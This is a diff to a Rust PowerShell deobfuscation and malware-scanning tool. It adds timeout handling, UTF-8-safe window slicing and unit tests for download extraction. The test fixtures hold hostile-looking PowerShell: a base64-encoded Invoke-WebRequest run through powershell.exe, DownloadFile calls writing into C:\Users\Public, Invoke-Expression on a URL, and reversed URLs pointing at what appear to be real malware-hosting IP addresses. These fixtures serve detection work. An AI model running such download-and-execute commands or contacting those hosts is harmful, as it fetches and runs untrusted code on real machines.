+                            name,
+                            url,
+                            cmd: format!("(ps1 large) {statement}"),
+                        });
+                        continue;
+                    }
+                }
+                env.traits.push(Trait::Download {
+                    cmd: format!("(ps1 large) {statement}"),
+                    src: url,
+                    dst: outfile_hint_from(statement),
+                });
+            }
+        }
+
+        for url in dynamic_download_invoke_urls(candidate)
+            .into_iter()
+            .chain(ps_literal_urls_in_download_context(candidate))
+        {
+            if known_launch_urls.contains(&url) || !seen.insert(url.clone()) {
+                continue;
+            }
+            env.traits.push(Trait::Download {
+                cmd: format!("(ps1 large) {primary}"),
+                src: url,
+                dst: outfile_hint_from(primary),
+            });
+        }
+    }
+}
+
+fn head_tail_sample(text: &str, side_len: usize) -> String {
+    if text.len() <= side_len.saturating_mul(2) {
+        return text.to_string();
+    }
+    let head_end = floor_char_boundary(text, side_len);
+    let tail_start = floor_char_boundary(text, text.len().saturating_sub(side_len));
+    let mut out = String::with_capacity(head_end + (text.len() - tail_start) + 72);
+    out.push_str(&text[..head_end]);
+    out.push_str("\r\n# batdeob: omitted middle of large extracted PowerShell payload\r\n");
+    out.push_str(&text[tail_start..]);
+    out
 }
 
 fn ps_url_inside_non_download_hash_option(text: &str, url_start: usize) -> bool {
@@ -7969,7 +10378,7 @@ fn ps_url_is_non_download_option_value(text: &str, url_start: usize) -> bool {
 }
 
 fn ps_url_inside_path_getfilename(text: &str, url_start: usize) -> bool {
-    let window_start = url_start.saturating_sub(128);
+    let window_start = floor_char_boundary(text, url_start.saturating_sub(128));
     let before_url = text[window_start..url_start].to_ascii_lowercase();
     before_url
         .rfind("getfilename")
@@ -8083,6 +10492,9 @@ fn is_schemeless_ip_url(url: &str) -> bool {
 }
 
 pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
+    if env.check_timeout() {
+        return;
+    }
     let filtered = text
         .lines()
         .filter(|line| !crate::deob_scan::command_starts_with_echo(line))
@@ -8125,6 +10537,7 @@ pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
         max_output_line_bytes: env.limits.max_output_line_bytes,
         max_traits_per_kind: 100,
     });
+    payload_env.limits.deadline = env.limits.deadline;
     if lower.contains("powershell") || lower.contains("pwsh") {
         crate::deob_scan::scan_embedded_powershell_invocations(scan_text, &mut payload_env);
         payload_env
@@ -8140,4 +10553,207 @@ pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
             Trait::Download { src, .. } => !known_downloads.contains(src),
             _ => true,
         }));
+}
+
+#[cfg(test)]
+mod timeout_tests {
+    use super::{scan_inline_powershell_text, scan_ps1_payloads};
+    use crate::env::{Config, Environment};
+    use crate::traits::Trait;
+    use std::time::{Duration, Instant};
+
+    fn expired_env() -> Environment {
+        let mut env = Environment::new(&Config {
+            timeout_secs: 0,
+            ..Config::default()
+        });
+        env.limits.deadline = Some(Instant::now() - Duration::from_secs(1));
+        env
+    }
+
+    #[test]
+    fn inline_powershell_scan_honors_expired_parent_deadline() {
+        let mut env = expired_env();
+
+        scan_inline_powershell_text(
+            "powershell -Command \"Invoke-WebRequest -Uri https://deadline.example/p\"",
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "expired inline PowerShell scan did not emit TimeoutHit: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { .. })),
+            "expired inline PowerShell scan should not continue extracting: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_payload_scan_honors_expired_deadline_before_scanning() {
+        let mut env = expired_env();
+        assert!(
+            env.push_extracted_ps1(b"Invoke-WebRequest -Uri https://deadline.example/p".to_vec())
+        );
+        env.all_extracted_ps1
+            .extend(std::mem::take(&mut env.exec_ps1));
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "expired ps1 payload scan did not emit TimeoutHit: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { .. })),
+            "expired ps1 payload scan should not continue extracting: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
+mod inline_frombase64_variable_tests {
+    use super::scan_ps1_payloads;
+    use crate::env::{Config, Environment};
+
+    #[test]
+    fn variable_frombase64_getstring_inner_is_queued_for_rescan() {
+        let wrapper = r#"
+$Codigo = 'SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovL2Zyb20tYjY0LXZhci5leGFtcGxlL3A='
+$Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Codigo))
+powershell.exe -command $Decoded
+"#;
+        let mut env = Environment::new(&Config::default());
+        assert!(env.push_extracted_ps1(wrapper.as_bytes().to_vec()));
+        env.all_extracted_ps1
+            .extend(std::mem::take(&mut env.exec_ps1));
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.all_extracted_ps1.iter().any(|payload| {
+                String::from_utf8_lossy(payload)
+                    .contains("Invoke-WebRequest -Uri https://from-b64-var.example/p")
+            }),
+            "decoded variable-backed FromBase64String payload was not queued: {:?}",
+            env.all_extracted_ps1
+        );
+    }
+}
+
+#[cfg(test)]
+mod reversed_url_tests {
+    use super::ps_reversed_urls;
+
+    #[test]
+    fn extracts_reversed_http_url_tokens() {
+        assert_eq!(
+            ps_reversed_urls("'txt.sgarevets/jxsn/151.11.691.581//:ptth'"),
+            vec!["http://185.196.11.151/nsxj/steverags.txt".to_string()]
+        );
+    }
+
+    #[test]
+    fn trims_marker_prefix_before_reversing_url_tokens() {
+        assert_eq!(
+            ps_reversed_urls("@(8LUtxt.sgarevets/jxsn/151.11.691.581//:ptth8LU"),
+            vec!["http://185.196.11.151/nsxj/steverags.txt".to_string()]
+        );
+    }
+}
+
+#[cfg(test)]
+mod ps_download_context_tests {
+    use super::{
+        ps_download_cmd_context, ps_url_inside_path_getfilename,
+        ps_url_is_secondary_downloadfile_argument_url,
+    };
+
+    #[test]
+    fn long_hex_context_is_sliced_around_url() {
+        let url = "https://context.example/payload";
+        let context = format!(
+            "$A{}='prefix';Invoke-Expression('{url}');$B{}",
+            "A".repeat(220),
+            "B".repeat(220)
+        );
+        let cmd = ps_download_cmd_context(3, &context, url);
+
+        assert!(cmd.contains(url), "{cmd}");
+        assert!(cmd.len() < 360, "{cmd}");
+        assert!(cmd.starts_with("(ps1 #3) ... "), "{cmd}");
+    }
+
+    #[test]
+    fn short_downloadfile_context_trims_outer_command_quote() {
+        let url = "https://context.example/Document.zip";
+        let context = "(New-Object -TypeName System.Net.WebClient).DownloadFile('https://context.example/Document.zip', 'C:\\Users\\Public\\Document.zip')\"";
+        let cmd = ps_download_cmd_context(2, context, url);
+
+        assert!(
+            cmd.ends_with("Document.zip')"),
+            "dangling wrapper quote leaked into command context: {cmd}"
+        );
+    }
+
+    #[test]
+    fn short_assignment_wrapped_downloadfile_context_uses_method_call() {
+        let url = "http://194.59.31.187/Craft67.csv";
+        let context =
+            "$Plastfiberoptisk='$Betalingsstandsningernes189.DownloadFile('http://194.59.31.187/Craft67.csv ',$Piaffes) '";
+        let cmd = ps_download_cmd_context(0, context, url);
+
+        assert!(
+            cmd.contains("$Betalingsstandsningernes189.DownloadFile("),
+            "method call missing from context: {cmd}"
+        );
+        assert!(
+            !cmd.contains("$Plastfiberoptisk="),
+            "assignment wrapper leaked into context: {cmd}"
+        );
+    }
+
+    #[test]
+    fn secondary_urls_inside_one_downloadfile_literal_are_not_promoted() {
+        let text = "$wc.DownloadFile('https://first.example/a>http://second.example/b>https://third.example/c ',$dst)";
+        let first_pos = text.find("https://first").unwrap_or(usize::MAX);
+        let second_pos = text.find("http://second").unwrap_or(usize::MAX);
+        let third_pos = text.find("https://third").unwrap_or(usize::MAX);
+
+        assert!(
+            !ps_url_is_secondary_downloadfile_argument_url(text, first_pos),
+            "first URL in DownloadFile argument should remain primary"
+        );
+        assert!(
+            ps_url_is_secondary_downloadfile_argument_url(text, second_pos),
+            "second separator-glued URL should be secondary"
+        );
+        assert!(
+            ps_url_is_secondary_downloadfile_argument_url(text, third_pos),
+            "third separator-glued URL should be secondary"
+        );
+    }
+
+    #[test]
+    fn getfilename_url_filter_handles_utf8_before_sliding_window() {
+        let url = "https://context.example/payload";
+        let text = format!("{}[IO.Path]::GetFileName({url})", "x上".repeat(50));
+        assert!(text.contains(url), "URL must be present");
+        let url_start = text.find(url).unwrap_or_default();
+
+        assert!(
+            !text.is_char_boundary(url_start - 128),
+            "test fixture must force the prior-byte window into a UTF-8 character"
+        );
+        assert!(ps_url_inside_path_getfilename(&text, url_start));
+    }
 }
